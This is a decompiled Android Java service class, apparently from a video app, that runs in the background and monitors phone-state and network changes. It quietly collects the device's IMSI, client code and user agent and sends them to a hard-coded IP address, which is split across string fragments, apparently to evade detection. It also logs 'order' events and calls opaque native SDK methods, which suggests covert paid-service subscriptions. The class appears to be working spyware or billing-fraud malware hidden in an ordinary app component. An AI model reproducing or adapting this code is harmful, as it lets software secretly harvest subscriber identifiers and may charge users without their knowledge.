package com.zyypt.video.mpdemo.implbyself;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.mv.xing2.MvSdkJar;
import com.mv.xing2.Util;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;
import java.util.TimeZone;

public class MPDestService
  extends Service
{
  static Context b = null;
  com.zyypt.video.mpdemo.d a = null;
  Handler c = new a(this);
  private Thread d;
  private BroadcastReceiver e;
  private TelephonyManager f;
  private SharedPreferences g;
  private Handler h = new Handler();
  private BroadcastReceiver i = new e(this);
  private PhoneStateListener j = new d(this);
  private Bundle k;
  private String l;
  private String m;
  private String n;
  private String o;
  private String p;
  private String q;
  
  public MPDestService() {}
  
  private void b(String paramString)
  {
    if (paramString == null) {}
    do
    {
      return;
      if (!paramString.equals("")) {
        break;
      }
      paramString = this.k.getString("contentid");
    } while ((paramString == null) || (paramString.length() == 0));
    paramString = paramString.split(",");
    int i3 = paramString.length;
    int i2 = new Random().nextInt();
    int i1 = i2;
    if (i2 < 0) {
      i1 = -i2;
    }
    String str = paramString[(i1 % i3)];
    this.k.putString("contentid", str);
    for (this.q = paramString[((i1 + 1) % i3)];; this.q = null)
    {
      i1 = MvSdkJar.callMethod(this, 1, this.k, this.l, this.m, this.n, this.o, this.p, this.c);
      Util.Log("HelloJni doTaskX2 ret: " + i1);
      return;
      this.k.putString("contentid", paramString);
    }
  }
  
  public static Intent c()
  {
    return new Intent("com.daemon.video.msgpush.implbyself.VideoService");
  }
  
  private void f()
  {
    IntentFilter localIntentFilter = new IntentFilter();
    localIntentFilter.addAction("com.daemon.video.msgpush.implbyself.show_daemon");
    registerReceiver(this.e, localIntentFilter);
  }
  
  private void g()
  {
    unregisterReceiver(this.e);
  }
  
  private void h()
  {
    this.f.listen(this.j, 64);
    IntentFilter localIntentFilter = new IntentFilter();
    localIntentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
    registerReceiver(this.i, localIntentFilter);
  }
  
  private void i()
  {
    this.f.listen(this.j, 0);
    unregisterReceiver(this.i);
  }
  
  private void j()
  {
    for (;;)
    {
      StringBuffer localStringBuffer2;
      try
      {
        Object localObject1 = Calendar.getInstance(TimeZone.getTimeZone("GMT+08:00"));
        int i1 = ((Calendar)localObject1).get(1);
        int i2 = ((Calendar)localObject1).get(2);
        int i3 = ((Calendar)localObject1).get(5);
        ((Calendar)localObject1).clear();
        ((Calendar)localObject1).set(i1, i2, i3);
        long l1 = ((Calendar)localObject1).getTime().getTime() / 1000L;
        localObject1 = this.g.edit();
        ((SharedPreferences.Editor)localObject1).putString("lastOrderChannelid", this.l);
        ((SharedPreferences.Editor)localObject1).putString("lastOrderTime", "" + l1);
        ((SharedPreferences.Editor)localObject1).commit();
        String str1 = Util.getClientCode(this);
        String str2 = Util.getIMSI(this);
        String str3 = Util.getUserAgent();
        Object localObject2 = this.k.getString("productid");
        localObject1 = localObject2;
        if (localObject2 == null) {
          localObject1 = "";
        }
        localObject2 = Build.VERSION.SDK;
        String str4 = Util.javaGetDataFromSharedPref(this, "string_n");
        String str5 = Util.javaGetDataFromSharedPref(this, "string_m");
        String str6 = this.l + str2 + (String)localObject1;
        str6 = com.zyypt.video.a.a(str6.substring(1, str6.length() - 1).getBytes());
        StringBuffer localStringBuffer1 = new StringBuffer(256);
        localStringBuffer1.append("http://114.215.187");
        localStringBuffer1.append(".159/deamon/index.php/SdkStats/orderStats");
        localStringBuffer2 = new StringBuffer(64);
        localStringBuffer2.append(localStringBuffer1.toString());
        localStringBuffer2.append("?channelid=" + this.l);
        localStringBuffer2.append("&clientcode=" + str1);
        localStringBuffer2.append("&wdimsi=" + str2);
        localStringBuffer2.append("&wdua=" + str3);
        localStringBuffer2.append("&product_id=" + (String)localObject1);
        localStringBuffer2.append("&client_version=" + "2.1.3");
        localStringBuffer2.append("&sdk_version=" + (String)localObject2);
        if (str4 != null) {
          localStringBuffer2.append("&string_n=" + str4);
        }
        if (str5 != null) {
          localStringBuffer2.append("&string_m=" + str5);
        }
        switch (Util.checkNetWork(this))
        {
        case 0: 
          localStringBuffer2.append("&sign=" + str6);
          localObject1 = localStringBuffer2.toString();
          localObject2 = new com.b.a.a.a();
          ((com.b.a.a.a)localObject2).a(15000);
          ((com.b.a.a.a)localObject2).a(Util.getUserAgent());
          ((com.b.a.a.a)localObject2).a((String)localObject1, new b(this));
          return;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
      localStringBuffer2.append("&net_type=WLAN");
      continue;
      localStringBuffer2.append("&net_type=WAP");
      continue;
      localStringBuffer2.append("&net_type=NET");
    }
  }
  
  public void a()
  {
    if (!this.d.isAlive()) {}
    try
    {
      this.d.start();
      return;
    }
    catch (IllegalThreadStateException localIllegalThreadStateException)
    {
      this.d = new f(this);
      this.d.start();
    }
  }
  
  public void a(Context paramContext, int paramInt)
  {
    try
    {
      Object localObject = new StringBuffer(256);
      ((StringBuffer)localObject).append("http://114.215.187");
      ((StringBuffer)localObject).append(".159/deamon/index.php/Sdk/dataCollect");
      int i1 = Util.checkNetWork(paramContext);
      String str1 = Util.getIMSI(paramContext);
      String str2 = Util.getUserAgent();
      paramContext = Util.javaGetDataFromSharedPref(paramContext, "string_m");
      String str3 = Util.getClientCode(this);
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append(((StringBuffer)localObject).toString());
      localStringBuilder.append("?wdimsi=" + str1);
      localStringBuilder.append("&wdua=" + str2);
      localStringBuilder.append("&clientcode=" + str3);
      if (paramContext != null) {
        localStringBuilder.append("&string_m=" + paramContext);
      }
      localStringBuilder.append("&client_version=" + "2.1.3");
      localStringBuilder.append("&step=" + paramInt);
      switch (i1)
      {
      }
      for (;;)
      {
        paramContext = localStringBuilder.toString();
        localObject = new com.b.a.a.a();
        ((com.b.a.a.a)localObject).a(15000);
        ((com.b.a.a.a)localObject).a(Util.getUserAgent());
        ((com.b.a.a.a)localObject).a(paramContext, new c(this));
        return;
        localStringBuilder.append("&net_type=WLAN");
        continue;
        localStringBuilder.append("&net_type=WAP");
        continue;
        localStringBuilder.append("&net_type=NET");
      }
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public void a(Bundle paramBundle, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    this.k = paramBundle;
    this.l = paramString1;
    this.m = paramString2;
    this.n = paramString3;
    this.o = paramString4;
    this.p = paramString5;
    int i1 = MvSdkJar.callMethod(this, 0, paramBundle, paramString1, paramString2, paramString3, paramString4, paramString5, this.c);
    Util.Log("HelloJni doTaskX ret: " + i1);
  }
  
  public void a(String paramString)
  {
    int i1 = MvSdkJar.MonitorNetworkStatus2(this, paramString, this.c);
    Util.Log("HelloJni doTaskX4 ret: " + i1);
  }
  
  public void b()
  {
    if (this.d.isAlive()) {}
    try
    {
      this.d.interrupt();
      return;
    }
    catch (SecurityException localSecurityException)
    {
      localSecurityException.printStackTrace();
    }
  }
  
  public SharedPreferences d()
  {
    return this.g;
  }
  
  public Handler e()
  {
    return this.h;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.f = ((TelephonyManager)getSystemService("phone"));
    this.g = getSharedPreferences("MsgPushDefinition", 0);
    this.d = new f(this);
    this.e = new MPDemoReceiver(this);
    this.a = com.zyypt.video.mpdemo.d.a(this);
    this.a.a();
    Object localObject = new StringBuffer(256);
    ((StringBuffer)localObject).append("http://114.215.187");
    ((StringBuffer)localObject).append(".159/deamon/index.php/SdkConfig/switchCp");
    this.a.a(((StringBuffer)localObject).toString());
    b = this;
    localObject = Util.getUserAgent();
    if (localObject != null) {
      this.a.a("useragent", (String)localObject);
    }
    a();
    f();
    h();
  }
  
  public void onDestroy()
  {
    g();
    i();
    b();
    super.onDestroy();
  }
}
